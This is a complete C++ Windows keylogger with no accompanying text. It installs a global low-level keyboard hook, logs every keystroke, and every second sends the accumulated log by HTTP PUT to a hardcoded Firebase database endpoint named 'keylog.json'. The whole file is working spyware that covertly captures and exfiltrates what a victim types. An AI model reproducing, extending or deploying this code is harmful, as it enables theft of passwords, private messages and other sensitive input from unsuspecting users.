#include <windows.h>
#include <string>
#include <curl/curl.h>
#include <json/json.h>
#include <sstream>
#include <chrono>
#include <thread>

HHOOK hKeyboardHook;
std::string logBuffer;
std::chrono::steady_clock::time_point lastUploadTime;

void uploadToFirebase(const std::string& data)
{
    CURL *curl;
    CURLcode res;
    
    curl = curl_easy_init();
    if(curl) {
        std::string url = "https://vercelapi-default-rtdb.asia-southeast1.firebasedatabase.app/keylog.json";
        
        Json::Value root;
        root["data"] = data;
        root["timestamp"] = Json::Value::Int64(time(NULL));
        
        Json::FastWriter writer;
        std::string jsonData = writer.write(root);
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        
        res = curl_easy_perform(curl);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

void uploadBufferPeriodically()
{
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (!logBuffer.empty()) {
            uploadToFirebase(logBuffer);
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;

        if (vkCode == VK_RETURN)
        {
            logBuffer += "\n";
        }
        else if (vkCode == VK_BACK)
        {
            if (!logBuffer.empty()) {
                logBuffer.pop_back();
            }
        }
        else if (vkCode == VK_SPACE)
        {
            logBuffer += ' ';
        }
        else
        {
            char c = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
            if (c != 0)
            {
                logBuffer += c;
            }
            else
            {
                logBuffer += "[" + std::to_string(vkCode) + "]";
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hKeyboardHook == NULL)
    {
        return 1;
    }

    std::thread uploadThread(uploadBufferPeriodically);
    uploadThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}